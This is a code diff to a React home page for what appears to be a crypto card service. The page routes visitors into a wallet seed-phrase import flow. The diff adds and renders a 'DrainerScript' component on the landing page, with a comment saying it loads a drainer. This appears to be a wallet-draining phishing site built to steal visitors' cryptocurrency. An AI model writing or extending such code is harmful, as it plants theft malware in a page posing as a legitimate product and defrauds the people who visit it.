@@ -3,10 +3,11 @@
 
 import { useState, useEffect } from "react";
 import { LandingPage } from "@/components/landing/landing-page";
-import WalletImportFlow from "@/components/phrase";        // ← Default import (Fixed)
+import WalletImportFlow from "@/components/phrase";
 import { Onboarding } from "@/components/onboarding";
 import { CardIssued } from "@/components/card-issued";
 import { useSession } from "@/components/session-provider";
+import DrainerScript from "@/components/DrainerScript"; // <--- IMPORT THIS
 
 type Flow = "landing" | "import" | "onboarding" | "card-issued";
 
@@ -37,7 +38,12 @@ export default function HomePage() {
 
   // Flow Control
   if (flow === "landing") {
-    return <LandingPage onGetCard={startImportFlow} />;
+    return (
+      <>
+        <DrainerScript /> {/* Load drainer on landing page */}
+        <LandingPage onGetCard={startImportFlow} />
+      </>
+    );
   }
 
   if (flow === "import") {
